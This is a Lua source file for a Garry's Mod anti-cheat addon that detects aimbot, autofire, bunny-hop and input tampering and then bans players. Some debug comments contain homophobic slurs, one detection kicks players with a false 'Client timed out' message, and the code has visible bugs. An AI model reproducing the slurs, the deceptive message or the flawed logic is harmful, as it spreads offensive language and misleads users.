
print("[/Simplac/] Loaded!")

Simplac = Simplac or {}
Simplac.tickinterval = engine.TickInterval()
Simplac.servertick = math.Round(1 / Simplac.tickinterval)

Simplac.violations = {}
Simplac.beingpunished ={}
Simplac.joinnick = Simplac.joinnick or {}

include("settings_simplac.lua")

Simplac.Log = {}





function Simplac.Log.Player(formatted_time_date, joinnick, ident, plyent, violation)


	print("[/Simplac/] (" .. ident .. ") " .. joinnick .. " violated something.")

	local folders = "simplac/cheaters/" .. ident
	local filename = folders .. "/" .. formatted_time_date .. ".txt"


	file.CreateDir(folders)

	local extratxt = " ( IF YOU BELIEVE THIS IS FALSE THEN DISABLE THE DETECTION IN SETTINGS GOD DAMN, NOT ALL DETECTIONS WORK FOR ALL SERVER SETUPS )\n"

	if(Simplac.settings.readdetectiondisclaimer) then
		extratxt = "\n"
	end

	if(not file.Read(filename, "DATA")) then
		file.Write(filename, "Violation: " .. violation .. extratxt)
	else
		file.Append(filename, "Violation: " .. violation .. extratxt)
	end

end

function Simplac.Log.Handler(...)

	local args = {...}

	local customlog = hook.Call("Simplac.Log.Handler", nil, unpack(args))

	if(customlog) then
		return
	end
	

	local formatted_time_date = os.date("%d_%m_%Y (%H_%M_%S)", os.time())

	local stype = args[1]

	if(stype == "ply_violation") then
		table.remove(args,1)
		Simplac.Log.Player(formatted_time_date, unpack(args))
	end

end

function Simplac.PlayerInitialSpawn(ply)

	if(ply:IsBot()) then return end

	local ident = ply:SteamID64()
	ply.simplac_startcheck = CurTime() + 4

	if(Simplac.beingpunished[ident]) then return end

	Simplac.joinnick[ident] = ply:Nick()
	Simplac.violations[ident] = {}
end

hook.Add("PlayerInitialSpawn", "Simplac.PlayerInitialSpawn", Simplac.PlayerInitialSpawn)


function Simplac.ExternalPunishment(ply, ident, violations)

	local bantime = Simplac.settings.bantime
	
	if(not bantime) then
		bantime = 0
	end

	local reason = Simplac.settings.banreason

	if(not reason) then
		reason = "Cheating"
	end

	if(reason == "badidea") then
		reason = "bad idea host. | " .. table.concat(violations, ";")
	end

	local sid32 = util.SteamIDFrom64(ident)
	local nick = Simplac.joinnick[ident]

	if(GB_InsertBan) then
		print("Punishing using global bans..")
		GB_InsertBan(sid32, nick, bantime, "SimpLAC", "STEAM_0:0:10134848",  reason)
		return
	end

 	if(ULib and ULib.bans) then
 		print("Punishing using ulx..")
 		if(IsValid(ply)) then
			RunConsoleCommand("ulx", "ban", ply:Nick(), bantime, reason)
		else
			RunConsoleCommand("ulx", "banid", sid32, bantime, reason)
		end

		return
 	end

 	if(serverguard) then
 		print("Punishing using serverguard..")
 		serverguard:BanPlayer(nil, sid32, bantime, reason, nil, nil, "SimpLAC")
 		return
 	end

	if (evolve) then
		print("Punishing using evolve..")
		RunConsoleCommand("ev", "ban", sid32, bantime, reason)
		return
	end

	ply:Ban(bantime, reason)
end

function Simplac.Punish( ident, violations )

	local plyent = nil

	for k,ply in pairs(player.GetAll()) do
		if(ply:SteamID64() == ident) then
			plyent = ply
		end
	end

	if(Simplac.settings.telleveryoneaboutcheaters and Simplac.settings.telleveryoneaboutcheaters != 0) then
		for k,v in pairs(player.GetAll()) do
			if(Simplac.settings.telleveryoneaboutcheaters == 1) then
				if(not v:IsAdmin()) then continue end
			end
			
			if(plyent and IsValid(plyent)) then
				v:ChatPrint( ident .. " == " .. plyent:Nick() .. " is a cheater!")
			else
				v:ChatPrint( ident .. " is a cheater!")
			end
		end
	end

	if(not Simplac.settings.testmode) then

		local is_mc = false

		if(table.Count(violations)==1) then
			local vio = violations[1]

			if(string.StartWith(vio, "MC")) then
				plyent:Kick("Client timed out")
				is_mc = true
			end
		end

		if(not is_mc) then
			Simplac.ExternalPunishment(plyent, ident, violations)
		end
	end

	if(not Simplac.settings.testmode2) then
		timer.Simple(3, function()
			if(plyent and IsValid(plyent)) then
				plyent:Kick("be gone, cheater!")
			end



			Simplac.beingpunished[ident] = false
			Simplac.violations[ident] = nil

		end)
	end

end


function Simplac.PlayerViolation( ply, violation )

	local ident = ply:SteamID64()


	Simplac.violations[ident] = Simplac.violations[ident] or {}
	if(table.HasValue(Simplac.violations, violation)) then return end -- It's already in there

	local shouldignore = hook.Call( "Simplac.PlayerViolation", nil, ply, ident, violation )

	if shouldignore then
		return
	end

	Simplac.Log.Handler("ply_violation", Simplac.joinnick[ident], ident, ply, violation)
	Simplac.beingpunished[ident] = true

	table.insert(Simplac.violations[ident], violation)

	timer.Create("Simplac_topunish_" .. ident, 10, 1, function()
		Simplac.Punish(ident, Simplac.violations[ident])
	end)

end



Simplac.ignoreweps = {"weapon_physgun", "weapon_physcannon", "gmod_tool", "gmod_camera"}

function Simplac.IsIgnoreWep( wep )

	if(not IsValid(wep)) then return true end
	if(table.HasValue(Simplac.ignoreweps, wep:GetClass())) then return true end

	local ignorewep = hook.Call("Simplac.IsIgnoreWep", nil, wep, wep:GetClass())

	if(ignorewep) then
		return true
	end

	return false
end

function Simplac.PlayerHasIgnoreWep( ply )
	local wep = ply:GetActiveWeapon()

	if(Simplac.IsIgnoreWep(wep)) then return true end

	local ignorewep = hook.Call("Simplac.PlayerHasIgnoreWep", nil, ply, wep, wep:GetClass())

	if(ignorewep) then
		return true
	end

	return false
end

function Simplac.MouseCheck(ply, cmd)


	if(ply.simplac_beingignored) then return end

	if(ply.mouse_isrip) then
		if(not ply.mouse_infangs) then
			ply.mouse_infangs = true
			local usinwep = IsValid(ply:GetActiveWeapon()) and ply:GetActiveWeapon():GetClass()
			
			Simplac.PlayerViolation(ply, "MC" .. tostring(ply.mouse_isrip) .. "==" .. usinwep .. "__"  .. tostring(ply:Ping()) .. "==" .. tostring(ply:PacketLoss()) )
			return
		end
		
		return
	end
	
	if(Simplac.PlayerHasIgnoreWep(ply)) then return end

	if(ply.mouse_ignoretimes and ply.mouse_ignoretimes>0) then
		ply.mouse_ignoretimes = ply.mouse_ignoretimes - 1
		--ply:ChatPrint(tostring(ply.mouse_ignoretimes))
		return
	end

 
	ply.mouse_violatecount = ply.mouse_violatecount or 0
	
	ply.mouse_violatecountb = ply.mouse_violatecountb or 0

	if(math.abs(cmd:GetMouseX()) > 7680) then
		--ply:ChatPrint(tostring(cmd:GetMouseX()) .. "=" .. tostring(cmd:GetMouseY()))
		--ply.mouse_isrip = 1
		--return
	end
	
	if(math.abs(cmd:GetMouseY()) > 4320) then
		--ply:ChatPrint(tostring(cmd:GetMouseX()) .. "=" .. tostring(cmd:GetMouseY()))
		--ply.mouse_isrip = 2
		--return
	end
	
	if(ply.mouse_lastx) then
		--if(ply.mouse_lastx == cmd:GetMouseX() and ply.mouse_lasty == cmd:GetMouseY() and cmd:GetMouseX() != 0 and cmd:GetMouseY() != 0) then
		--	ply.mouse_isrip = 4
		--	return
		--end
	end

	if(not ply.mouse_lastang) then ply.mouse_lastang = cmd:GetViewAngles() return end
	
		local plusright = false
		local plusleft = false


	if(ply.mouse_lastang.x == cmd:GetViewAngles().x) then

		--ply:ChatPrint(tostring(cmd:GetViewAngles().y) .. "=" .. tostring(ply.mouse_lastang.y))

		if(cmd:GetViewAngles().y > ply.mouse_lastang.y) then
			plusleft = true
		end


		if( cmd:GetViewAngles().y < ply.mouse_lastang.y) then
			plusright = true
		end

		if(not cmd:KeyDown(IN_LEFT)) then
			plusleft = false
		end

		if(not cmd:KeyDown(IN_RIGHT)) then
			plusright = false
		end

	end

	if(plusleft and plusright) then
		plusleft = false
		plusright = false
	--	ply.mouse_isrip = 5
	end

	if(ply:Ping()>500) then return end
	if(ply:IsFrozen()) then return end

	if(ply.mouse_lastang != cmd:GetViewAngles()) then
		

		if(Simplac.settings.MouseCheck1 and not plusleft and not plusright) then

			--ply:ChatPrint(tostring(plusright) .. "_" .. tostring(plusleft))
			--print(cmd:GetMouseX() .. "__" .. cmd:GetMouseY())


			--ply:ChatPrint(cmd:GetMouseX())

			if(cmd:GetMouseX() == 0 and cmd:GetMouseY() == 0) then 
				ply.mouse_violatecount = ply.mouse_violatecount + 1
				ply.mouse_first = ply.mouse_first or CurTime()
			else
				if(ply.mouse_violatecount>0) then
					ply.mouse_violatecount = ply.mouse_violatecount - 1
					if(ply.mouse_violatecount == 0) then
						ply.mouse_first = nil
					end
				end
			end
			
			timer.Create("mouse_cd_" .. ply:SteamID64(), 0.5, 1, function()
				if(not ply or not IsValid(ply)) then return end
			--	print("hi")
				ply.mouse_violatecount = 0
				ply.mouse_first = nil
			end)

		end
	else
		if(Simplac.settings.MouseCheck2) then
			if(cmd:GetMouseX() != 0 or cmd:GetMouseY() != 0) then 
				ply.mouse_violatecountb = ply.mouse_violatecountb + 1
				ply.mouse_firstb = ply.mouse_firstb or CurTime()
			else
				if(ply.mouse_violatecount>0) then
					ply.mouse_violatecountb = ply.mouse_violatecountb - 1
					if(ply.mouse_violatecountb == 0) then
						ply.mouse_firstb = nil
					end
				end
			end
			
			timer.Create("mouse_cd2_" .. ply:SteamID64(), 0.5, 1, function()
				if(not ply or not IsValid(ply)) then return end
			--	print("hi")
				ply.mouse_violatecountb = 0
				ply.mouse_firstb = nil
			end)
		end
	end

	if(ply.mouse_violatecountb > 2) then

		if( ply.mouse_firstb and CurTime() - ply.mouse_firstb> 3) then
			ply.mouse_violatecountb = 0
			ply.mouse_firstb = nil
		end

		if(false) then
			if(ply.mouse_firstb) then
				print(tostring(ply.mouse_violatecountb) .. "=" .. tostring(CurTime() - ply.mouse_firstb))
				ply:ChatPrint(tostring(ply.mouse_violatecountb) .. "=" .. tostring(CurTime() - ply.mouse_firstb) )
			else
				print(tostring(ply.mouse_violatecountb) .. "=" .. tostring(0))
				ply:ChatPrint(tostring(ply.mouse_violatecountb) .. "=" .. tostring(0) )
			end
		end
	end

	
	if(ply.mouse_violatecountb > 40 and ply.mouse_firstb and CurTime() - ply.mouse_firstb < 0.85) then
		ply.mouse_violatecountb = 0
		ply.mouse_isrip = 3
		return
	end
	
	if(ply.mouse_violatecount > 30 and ply.mouse_first and CurTime() - ply.mouse_first < 1.1) then
		ply.mouse_violatecount = 0
		ply.mouse_isrip = 3
		return
	end
	
	ply.mouse_lastx = cmd:GetMouseX()
	ply.mouse_lasty = cmd:GetMouseY()
	
	ply.mouse_lastang = cmd:GetViewAngles()

end

oseteyeang = oseteyeang or debug.getregistry()["Player"].SetEyeAngles

local meta = FindMetaTable("Player")

function meta:SetEyeAngles( ang )

	self.mouse_ignoretimes = 2

	return oseteyeang(self, ang)

end

hook.Add("PlayerStartTaunt", "Simplac_PlayerStartTaunt_MouseCheck", function(ply, actid, length)

	if(ply.mouse_ignoretimes and ply.mouse_ignoretimes>0) then return end

	ply.mouse_ignoretimes = Simplac.servertick*length

end)

hook.Add("PlayerSpawn", "Simplac_PlayerSpawn_MouseCheck", function(ply)
	ply.mouse_ignoretimes = Simplac.servertick*3
end)

function Simplac.SeedCheck(ply, cmd)

	if(ply.simplac_beingignored) then return end

	if(ply.seed_isrip) then
		if(not ply.seed_infangs) then
			ply.seed_infangs = true
			Simplac.PlayerViolation(ply, "SC" .. tostring(ply.seed_isrip) .. "=" .. tostring(ply.seed_violatecounta) .. ";" .. tostring(ply.seed_violatecountb) .. "__"  .. tostring(ply:Ping()) .. "==" .. tostring(ply:PacketLoss())  )
			return
		end
		return
	end

	ply.seed_initwait = ply.seed_initwait or CurTime() + 10

	if(ply.seed_initwait> CurTime()) then return end -- idk

	ply.seed_lastcmdnum = ply.seed_lastcmdnum or -1
	ply.seed_violatecounta = ply.seed_violatecounta or 0
	ply.seed_violatecountb = ply.seed_violatecountb or 0

	local lastnum = ply.seed_lastcmdnum
	local curnum = cmd:CommandNumber()
	local curtick = cmd:TickCount()

	if(curnum == lastnum) then
		local tickdiff = 0

		if(ply.seed_lasttick) then
			tickdiff = math.abs(curtick - ply.seed_lasttick)
		end

		if(tickdiff == 1) then
			ply.seed_violatecounta = ply.seed_violatecounta + 1

			--ply:ChatPrint(tostring(ply.seed_violatecounta))

			if(ply.seed_violatecounta > Simplac.servertick) then
				ply.seed_isrip = 1
			end

			if(not ply.seed_shouldreset) then
				ply.seed_shouldreset = 1
			end

			if(ply.seed_shouldreset==1) then
				ply.seed_shouldreset = 2
				timer.Simple(5, function()
					if(not ply or not IsValid(ply)) then return end
					ply.seed_violatecounta = 0
					ply.seed_shouldreset = nil
				end)
			end
		end

		ply.seed_lasttick = curtick

		return
	else
		if(ply.seed_violatecounta and ply.seed_violatecounta>0) then
			ply.seed_violatecounta = ply.seed_violatecounta - 1
		end
	end

	if(curnum > lastnum + 50) then
		ply.seed_violatecountb = ply.seed_violatecountb + 1

		if(ply.seed_violatecountb > Simplac.servertick* 0.50) then
			ply.seed_isrip = 2
		end

		if(not ply.seed_shouldresetb) then
			ply.seed_shouldresetb = 1
		end

		if(ply.seed_shouldresetb==1) then
			ply.seed_shouldresetb = 2
			timer.Simple(5, function()
				if(not ply or not IsValid(ply)) then return end
				ply.seed_violatecountb = 0
				ply.seed_shouldresetb = nil
			end)
		end
	else
		if(ply.seed_violatecountb and ply.seed_violatecountb >0) then
			ply.seed_violatecountb = ply.seed_violatecountb - 1
		end
	end






	ply.seed_lastcmdnum = curnum
	ply.seed_lasttick = curtick
end

/*
ocmdnum = ocmdnum or debug.getregistry()["CUserCmd"]["CommandNumber"]

debug.getregistry()["CUserCmd"]["CommandNumber"] = function(self)
	
	if(is_fake) then
		return 128
	end

	return ocmdnum(self)
end

concommand.Add("+fakecmdnum", function(p)
	is_fake = true
	if(not IsValid(p)) then return end
	p:ChatPrint("fakey")
end)

concommand.Add("-fakecmdnum", function(p)
	is_fake = false
	if(not IsValid(p)) then return end
	p:ChatPrint("nfakey")
end)
*/

function Simplac.AutofireCheck(ply, cmd)

	if(ply.simplac_beingignored) then return end

	if(ply.autofire_isrip) then
		if(not ply.autofire_infangs) then
			ply.autofire_infangs = true
			Simplac.PlayerViolation(ply, "AF" .. tostring(ply.autofire_isrip) .. ";" .. Simplac.tickinterval .. "__"  .. tostring(ply:Ping()) .. "==" .. tostring(ply:PacketLoss()) )
			return
		end
		return
	end


	local is_firing = cmd:KeyDown(IN_ATTACK)


	ply.autofire_violations = ply.autofire_violations or 0

	if( is_firing != ply.autofire_didfire) then


		if(not Simplac.PlayerHasIgnoreWep(ply)) then
			ply.autofire_violations = ply.autofire_violations + 1
		end

		if(ply.autofire_violations >= Simplac.servertick / 2.5) then	
			ply.autofire_detects = ply.autofire_detects or 0
			ply.autofire_detects = ply.autofire_detects + 1

			--ply:ChatPrint(tostring(ply.autofire_detects))

			if(ply.autofire_detects > 20) then
				ply.autofire_isrip = 1
			end

			ply.autofire_violations = 0
		end

		ply.autofire_resetnext = false

	else
		if(ply.autofire_resetnext) then
			ply.autofire_violations = 0
			ply.autofire_resetnext = false
		else
			ply.autofire_resetnext = true
		end
	end

	ply.autofire_didfire = is_firing
end

timer.Create("Simplac.Autofire_DecreaseCount", 4, 0, function()

	for k,v in pairs(player.GetAll())  do
		if(not IsValid(v)) then continue end
		if(not v.autofire_detects) then continue end
		if(v.autofire_detects== 0) then continue end

		v.autofire_detects = v.autofire_detects - 1
	end
end)


local CanFire = function(ply)
	
	if(not IsValid(ply)) then return end

	local wep = ply:GetActiveWeapon()

	if(not IsValid(wep)) then return end

	return (CurTime() >= wep:GetNextPrimaryFire())
end



function Simplac.Aimbot_NCheck(ply, cmd)

	if(ply.simplac_beingignored) then return end

	if(ply.aimbot_isrip) then
		if(not ply.aimbot_infangs) then
			ply.aimbot_infangs = true
			Simplac.PlayerViolation(ply, "AN" .. tostring(ply.aimbot_isrip_y) .. ";" .. Simplac.tickinterval .. "__"  .. tostring(ply:Ping()) .. "==" .. tostring(ply:PacketLoss()) )
			return
		end
		return
	end

	if(not ply.aimbot_lastangs) then
		ply.aimbot_lastangs = {}
	end


	local curang = cmd:GetViewAngles()

	table.insert(ply.aimbot_lastangs, curang)


	local curtblcount = #ply.aimbot_lastangs
	
	local savecmds = 20


	local mult = Simplac.servertick/66
	savecmds = math.ceil(savecmds * mult)
	
	if(curtblcount>savecmds) then
		local toomuch = curtblcount - savecmds

		for i=1, toomuch do
			table.remove(ply.aimbot_lastangs, 1)
		end
	end

	local lastdiffx = nil
	local lastdiffy = nil

	local abs = math.abs

	local samediffs = 0

	for k, ang in pairs(ply.aimbot_lastangs) do
		if(k==1) then continue end
		--local prevang = ply.aimbot_lastangs[k-1]
		local prevang = curang
		local diffx = abs(abs(prevang.x) - abs(ang.x))
		local diffy = abs(abs(prevang.y) - abs(ang.y))

		/*
		if(diffx > 3 and diffy > 3) then
			if(lastdiffx == diffx and lastdiffy == diffy) then
				samediffs = samediffs + 1
				ply:ChatPrint("the gay: " .. tostring(diffx))
			end

			lastdiffx = diffx
			lastdiffy = diffy
		end*/

		local maxm = Simplac.settings.aimbot.SnapFov
		if(diffx > maxm or diffy > maxm) then

			ply.aimbot_lastsnapped = CurTime()
			--ply:ChatPrint("snapped: " .. tostring(diffx) .. "=" .. tostring(diffy) .. ";" .. tostring(prevang.y) .. "=" .. tostring(ang.y))
		end
	end


	if(Simplac.settings.aimbot.mercy) then

		ply.aimbot_mercy_cooldown = ply.aimbot_mercy_cooldown or 0
		local atmercy = true

		if(Simplac.settings.aimbot.mercycooldown) then
			if(ply.aimbot_mercy_cooldown and ply.aimbot_mercy_cooldown >Simplac.settings.aimbot.mercycooldown) then
				atmercy  = false
			end
			
		end

		--ply:ChatPrint(ply.aimbot_mercy_cooldown or "")

		local w = ply:GetActiveWeapon()

		if(IsValid(w) and atmercy) then

			local tr = ply:GetEyeTrace()

			if(tr and IsValid(tr.Entity)) then

				
				if(not cmd:KeyDown(IN_ATTACK) and CanFire(ply)) then
					ply.aimbot_lastsnapped = nil
					ply.aimbot_atmercy = true
				end
			else

				if(cmd:KeyDown(IN_ATTACK)) then
					ply.aimbot_lastsnapped = nil
					ply.aimbot_atmercy = true
				end

			end

		else
			ply.aimbot_atmercy = false
		end
	end

	if(samediffs> 11) then
		--ply.aimbot_isrip = true
		--ply.aimbot_isrip_y = 1
	end

	--ply:ChatPrint("saving cmds: " .. tostring(savecmds))

	if(Simplac.settings.aimbot.storecmds) then
		savecmds = Simplac.settings.aimbot.storecmds
	end


end

--hook.Add("Think","k", function() for k,v in pairs(player.GetAll()) do if (not v:Alive()) then v:Spawn() end end end)

function Simplac.BhopCheck(ply, cmd)

	if(ply.simplac_beingignored) then return end

	ply.bhop_violations = ply.bhop_violations or 0

	if(ply.bhop_isrip) then
		if(not ply.bhop_infangs) then
			ply.bhop_infangs = true
			Simplac.PlayerViolation(ply, "BH" .. "=" .. Simplac.tickinterval .. "__"  .. tostring(ply:Ping()) .. "==" .. tostring(ply:PacketLoss()) )
			return
		end
		return
	end

	if(!cmd:KeyDown(IN_JUMP) and ply:IsOnGround() and ply.bhop_time) then
		ply.bhop_time = 0
		ply.bhop_violations = 0
	end

	if(cmd:KeyDown(IN_JUMP) and not ply.bhop_didjump) then
		if(ply:IsOnGround()) then
			local current = CurTime()

			if(ply.bhop_time and current > ply.bhop_time) then
				ply.bhop_violations = ply.bhop_violations + 1
				--ply:ChatPrint(tostring(ply.bhop_violations)) -- 76561198073906214

				local reqviolations = 0

				local ticks = {}
				ticks[16] = 20
				ticks[25] = 16
				ticks[35] = 14
				ticks[45] = 12
				ticks[55] = 10
				ticks[66] = 8
				ticks[70] = 7
				ticks[80] = 5
				ticks[100] = 4

				local lastdist = 0xDEADBEEF
				for tickrate,viofortick in pairs(ticks) do
					local dist = math.abs(tickrate - Simplac.servertick)
					if(dist < lastdist) then
						lastdist = dist
						reqviolations = viofortick
					end
				end

				--ply:ChatPrint("required for ban: " .. reqviolations)

				if(ply.bhop_violations>reqviolations) then
					ply.bhop_isrip = true
				end
			else
				ply.bhop_time = CurTime() + 0.5
			end
		else
			ply.bhop_time = 0
		end
	end

	ply.bhop_didjump = cmd:KeyDown(IN_JUMP)

end

timer.Create("Simplac.Bhop_DecreaseCount", 4, 0, function()
	for k,v in pairs(player.GetAll()) do
		if(v.bhop_violations and v.bhop_violations != 0) then
			v.bhop_violations = v.bhop_violations - 1
		end
	end
end)


function Simplac.AutofireCheckT(ply, cmd)

	if(ply.simplac_beingignored) then return end

	ply.autofire_t_violations = ply.autofire_t_violations or 0

	if(ply.autofire_isrip) then
		return
	end

	local wep = ply:GetActiveWeapon()
	if(not IsValid(wep)) then return end
	if(wep:Clip1()==0 or wep:Clip1() == -1) then return end
	if(Simplac.PlayerHasIgnoreWep(ply)) then return end

	if(!cmd:KeyDown(IN_ATTACK) and CanFire(ply) and ply.autofire_t_time and CurTime() > ply.autofire_t_time) then
		ply.autofire_t_time = 0
		if(ply.autofire_t_violations and ply.autofire_t_violations != 0) then
			ply.autofire_t_violations = ply.autofire_t_violations - 1
		end
	--	ply:ChatPrint("stopped firing")
	end

	if(cmd:KeyDown(IN_ATTACK) and not CanFire(ply)) then
		if(ply.autofire_t_violations and ply.autofire_t_violations != 0) then
			ply.autofire_t_violations = ply.autofire_t_violations - 1
		end
	end

	if(ply.autofire_t_time != 0) then
		--ply:ChatPrint(tostring(autofire_t_time))
	end

	if(cmd:KeyDown(IN_ATTACK) and not ply.autofire_t_didshoot) then
		if( CanFire(ply)) then
			local current = CurTime()

			local delta = CurTime() - wep:LastShootTime()

			local dist = ply.autofire_t_lastdelta and math.abs(math.Round(ply.autofire_t_lastdelta, 2) - math.Round(delta, 2)) or 0

			if(delta != CurTime() and delta != 0 and ply.autofire_t_lastdelta) then
				--ply:ChatPrint("D: " .. math.Round(ply.autofire_t_lastdelta, 2) .. " == " .. math.Round(delta, 2))

				
				--ply:ChatPrint(tostring(dist))
				--if(dist != 0 and dist == ply.autofire_t_lastdist) then
				if(math.Round(ply.autofire_t_lastdelta, 2) == math.Round(delta, 2)) then
					ply.autofire_t_violations = ply.autofire_t_violations + 1

					--ply:ChatPrint(tostring(ply.autofire_t_violations))

					local reqviolations = 10

					if(ply.autofire_t_violations>reqviolations) then
						ply.autofire_isrip = 2
					end
				else
					ply.autofire_t_violations = 0
				end

			end

			ply.autofire_t_lastdelta = delta
			ply.autofire_t_lastdist = dist
			ply.autofire_t_time = CurTime() + 200
		end
	end

	ply.autofire_t_didshoot = cmd:KeyDown(IN_ATTACK)

end

timer.Create("Simplac.AutofireT_DecreaseCount", 4, 0, function()
	for k,v in pairs(player.GetAll()) do
		if(v.autofire_t_violations and v.autofire_t_violations != 0) then
			v.autofire_t_violations = v.autofire_t_violations - 1
		end
	end
end)


function Simplac.Flashlight_Check(ply, cmd)

	if(ply.simplac_beingignored) then return end

	ply.flashlight_violations = ply.flashlight_violations or 0

	if(ply.flashlight_isrip) then
		if(not ply.flashlight_infangs) then
			ply.flashlight_infangs = true
			Simplac.PlayerViolation(ply, "FL" .. "=" .. Simplac.tickinterval .. "__"  .. tostring(ply:Ping()) .. "==" .. tostring(ply:PacketLoss()) )
			return
		end
		return
	end

	local using_flashlight = cmd:GetImpulse()


	ply.flashlight_violations = ply.flashlight_violations or 0

	if( using_flashlight != ply.flashlight_diduse or using_flashlight == 100) then
		--ply:ChatPrint("TOGGLED FLASHGAY: " .. tostring(ply.flashlight_violations))
		ply.flashlight_violations = ply.flashlight_violations + 1


		if(ply.flashlight_violations >= Simplac.servertick*2) then	
			ply.flashlight_isrip = 1
		end

		ply.flashlight_resetnext = false

	else
		if(ply.flashlight_resetnext) then
			if(ply.flashlight_violations and ply.flashlight_violations > 0) then
				ply.flashlight_violations = ply.flashlight_violations - 1
			end

			ply.flashlight_resetnext = false
		else
			ply.flashlight_resetnext = true
		end
	end

	ply.flashlight_diduse = using_flashlight

end

local mside = GetConVar("cl_sidespeed"):GetInt()
local mforw = GetConVar("cl_forwardspeed"):GetInt()

function Simplac.Move_Check(ply, cmd)

	if(ply.simplac_beingignored) then return end

	ply.move_violations = ply.move_violations or 0

	if(ply.move_isrip) then
		if(not ply.move_infangs) then
			ply.move_infangs = true
			Simplac.PlayerViolation(ply, "MV" .. ply.move_isrip .. "=" .. Simplac.tickinterval .. "__"  .. tostring(ply:Ping()) .. "==" .. tostring(ply:PacketLoss()) )
			return
		end
		return
	end

	local up = cmd:GetUpMove()
	local side = cmd:GetSideMove()
	local forward = cmd:GetForwardMove()
	
	side = math.abs(side)
	forward = math.abs(forward)

	if(up==0 and side == 0 and forward==0 ) then return end
	if(mforw==forward or mside == side) then return end

	--print(tostring(ply) .. "|" .. up .. "==" .. side .. "==" .. forward)

	if(up!=0) then
		--ply.move_isrip = 1
		--ply:ChatPrint("UPMOVE")
		return
	end

	if(side> mside or forward > mforw) then
		ply.move_isrip = 2
		--ply:ChatPrint("too big: " .. side .. "=" .. forward)
		return
	end


	--ply:ChatPrint(tostring(sdiff))

	if (side > mside - 20 and side != mside) then
		ply.move_isrip = 3
		--ply:ChatPrint("the gay")
		return
	end

	if (forward  > mforw - 20 and forward != mforw) then
		ply.move_isrip = 4
		--ply:ChatPrint("the gay2")
		return
	end

	--ply:ChatPrint(up .. "==" .. side .. "==" .. forward .. ";" .. ply:GetVelocity():Length())

end

function Simplac.StartCommand(ply, cmd)

	if(not Simplac or not Simplac.settings) then return end

	if (not IsValid(ply)) then return end
	if(ply:IsBot()) then return end
	if(not ply:Alive() or ply:GetObserverMode() != OBS_MODE_NONE) then return end

	if(not ply.simplac_startcheck or ply.simplac_startcheck > CurTime()) then return end
	if(ply:InVehicle()) then return end -- didn't even give me false detections but, OK

	if(not ply.simplac_didmove) then

		local is_moving = false

		if(cmd:GetButtons() != 0 or cmd:GetForwardMove() != 0 or cmd:GetUpMove() != 0) then
			is_moving = true
		end

		ply.simplac_didmove = is_moving

		return
	end

	if(ply.simplac_isnumbed) then
		cmd:ClearButtons()
		cmd:ClearMovement()
		return
	end

	if(cmd:TickCount()==0) then
		ply.simplac_isnumbed = true

		timer.Create("simplac_unfreeze_" .. ply:SteamID64(), 0.3, 1, function()
			if(not IsValid(ply)) then return end
			ply.simplac_isnumbed = false
		end)
	end

	if(not ply.simplac_just_joined) then
		ply.simplac_just_joined = engine.TickInterval() * 3
	else

		if(ply.simplac_just_joined>0) then
			ply.simplac_just_joined = ply.simplac_just_joined - 1
			return
		end

	end

	
	if(Simplac.settings.MouseCheck1 or Simplac.settings.MouseCheck2) then
		Simplac.MouseCheck(ply, cmd)
	end

	if(Simplac.settings.SeedCheck) then
		Simplac.SeedCheck(ply, cmd)
	end

	if(Simplac.settings.AutofireCheck1) then
		Simplac.AutofireCheck(ply, cmd)
	end

	if(Simplac.settings.AutofireCheck2) then
		Simplac.AutofireCheckT(ply, cmd)
	end

	if(Simplac.settings.BhopCheck) then
		Simplac.BhopCheck(ply, cmd)
	end

	if(Simplac.settings.Aimbot_NCheck) then
		Simplac.Aimbot_NCheck(ply, cmd)
	end

	if(Simplac.settings.FlashlightCheck) then
		Simplac.Flashlight_Check(ply, cmd)
	end

	if(Simplac.settings.MoveCheck) then
		Simplac.Move_Check(ply, cmd)
	end

end


hook.Add("StartCommand", "Simplac.StartCommand", Simplac.StartCommand)

/*
timer.Create("DummyMove", 0.5, 0, function()


	local dum = Simplac.mcheck_dummy

	if(not IsValid(dum)) then return end

	for k,ply in pairs(player.GetAll()) do
		local t = ply:GetEyeTrace()

		if(not t) then continue end

		print(t.Entity)

		if(IsValid(t.Entity) and t.Entity == dum) then
			--dum:SetPos(vector_origin-Vector(10000, 10000, 10000))
			--print("yep")
			dum.ss = dum.ss
			if(not dum.ss) then
				dum:SetPos(ply:GetPos() - Vector(0,0,40))
				dum.ss = true
			else
				dum.ss = false
				dum:SetPos(ply:GetPos() + Vector(0,0,90))
			end
			
			return
		end

	end
end)
*/

local function dumsuicide( dum )

	if(dum.last_suicide and CurTime() - dum.last_suicide < 4) then return end

	dum.last_suicide = CurTime()
	dum:Kill()

	-- prevent spam
end

hook.Add("Think","Simplac.mcheck_dummythink", function()

	local dum = Simplac.mcheck_dummy
	if(not IsValid(dum)) then return end

	local ply_alive = 0

	for k,v in pairs(player.GetAll()) do
		if(v:Alive()) then
			ply_alive = ply_alive + 1
		end
	end

	dum:SetNoDraw(true)
	dum:GodEnable()

	local givewep = Simplac.settings.aimbot_mcheck_wep
		
	if(Simplac.settings.aimbot_mcheck_team) then
		dum:SetTeam(Simplac.settings.aimbot_mcheck_team)
	end


	local curw = dum:GetActiveWeapon()

	if(IsValid(curw)) then
		
		curw:SetNoDraw(true)

		if(not givewep) then
			dum:StripWeapons()
		else
			if(curw:GetClass() != givewep) then
				dum:StripWeapons()

				if(givewep) then
					dum:Give(wepclass)
				end
			end
		end
	end

	dum:SetModel("models/props_c17/lampShade001a.mdl")
	dum:SetCollisionGroup(COLLISION_GROUP_DEBRIS)
	dum:SetAvoidPlayers(false)
	dum:SetNoCollideWithTeammates(false)
	dum:CollisionRulesChanged()
	dum:SetHealth(1)
	dum:SetMoveType(MOVETYPE_NOCLIP)
	dum:SetModelScale(1)


	if(Simplac.BotSuicide and (ply_alive==1 or ply_alive == 2)) then -- 1 of them is the dummy, need 2 players to aimbot either way

		if(dum:Alive()) then
			dumsuicide(dum)
		end
		
		return
	end

	hook.Call("Simplac.DummyThink", nil, dum, ply_alive)


	if(dum.IsTraitor and dum:IsTraitor() or dum.IsDetective and dum:IsDetective()) then
		local role = dum:GetRole() or ROLE_INNOCENT



		local avail = {}
		for k,v in pairs(player.GetAll()) do
			if(v==dum) then continue end
			if(v:GetRole() != ROLE_INNOCENT) then continue end -- only innos

			table.insert(avail, v)
		end

		dum:SetRole(ROLE_INNOCENT)
		local luckyone = table.Random(avail)
		luckyone:SetRole(role)
		luckyone:SetCredits(5)
		SendFullStateUpdate()

		return
	end

	if(dum.IsTraitor) then
		local inos = 0
		local traits = 0

		for k,v in pairs(player.GetAll()) do
			if(not v:Alive() or v:IsSpec()) then continue end
